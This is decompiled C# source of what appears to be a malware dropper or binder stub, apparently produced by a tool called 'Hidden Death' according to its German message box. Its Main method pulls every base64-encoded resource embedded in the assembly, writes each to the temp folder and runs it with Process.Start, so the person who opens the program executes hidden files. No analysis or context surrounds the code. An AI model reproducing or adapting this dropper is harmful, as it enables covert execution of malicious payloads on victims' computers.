using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class mI187gZE56
{
	[STAThread]
	public static void Main()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		ResourceManager resourceManager = new ResourceManager("xyz", Assembly.GetExecutingAssembly());
		object resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
		Interaction.MsgBox((object)"Dieses Programm wurde mit der unregistrierten Version von Hidden Death erstellt.", (MsgBoxStyle)0, (object)null);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)resourceSet).GetEnumerator();
			DictionaryEntry dictionaryEntry = default(DictionaryEntry);
			while (enumerator.MoveNext())
			{
				object current = enumerator.Current;
				DictionaryEntry dictionaryEntry2 = ((current != null) ? ((DictionaryEntry)current) : dictionaryEntry);
				byte[] array = Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(Conversions.ToString(dictionaryEntry2.Key))));
				FileStream fileStream = new FileStream(Conversions.ToString(Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key)), FileMode.Create);
				fileStream.Write(array, 0, array.Length);
				fileStream.Close();
				NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key) }, (string[])null, (Type[])null, (bool[])null, true);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}
}
